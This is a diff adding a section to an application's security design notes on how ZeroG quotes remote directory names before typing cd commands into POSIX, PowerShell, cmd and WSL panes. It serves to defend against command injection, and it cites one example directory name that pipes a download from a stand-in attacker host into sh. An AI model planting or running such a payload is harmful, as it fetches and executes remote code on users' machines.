@@ -81,6 +81,36 @@ the narrowest part of the application worth stating plainly:
   fingerprint, is put to the user. Passwords and passphrases are written to the
   client and are not stored, logged, or returned to the renderer.
 
+## Changing directory from the browser
+
+Double-clicking a folder in a pane's directory browser makes ZeroG type a command
+into that pane. Everywhere else in this application a path is passed as an
+element of an argument vector, where quoting cannot matter; here the path becomes
+part of a shell line, and the directory names come from the far side of an SSH
+connection or from a filesystem someone else may be able to write to. A directory
+named `$(curl evil.example.com | sh)` is a plausible thing to find in a listing.
+
+So the quoting is the whole defence, it lives in one place
+(`src/renderer/pane-directory.ts`), and it is exercised against a real `sh` in
+`tests/pane-directory-shell.test.ts` — a test that creates directories whose
+names contain commands and asserts that after cd'ing into every one of them,
+none of those commands ran.
+
+- POSIX shells: single quotes, with an embedded quote closed and reopened. No
+  expansion of any kind survives single quotes.
+- PowerShell: `Set-Location -LiteralPath` with single quotes doubled.
+  `-LiteralPath` rather than `-Path` because a directory named `[1]` is a
+  wildcard to `Set-Location`, which would fail to find a directory that exists.
+- Command Prompt: `cd /d` with double quotes, and a name containing a double
+  quote is refused — `cmd` has no escape for it that is correct in general.
+- A name containing a carriage return or newline is refused for every shell. It
+  would submit the line early, which is a second command by definition.
+- Where the shell family cannot be determined, nothing is typed.
+
+A WSL pane's path is translated across the `\\wsl.localhost\` share boundary
+before it is quoted, and a path that does not belong to that pane's own
+distribution is refused rather than translated approximately.
+
 ## Network egress from the renderer
 
 The renderer's Content-Security-Policy limits `connect-src` to:
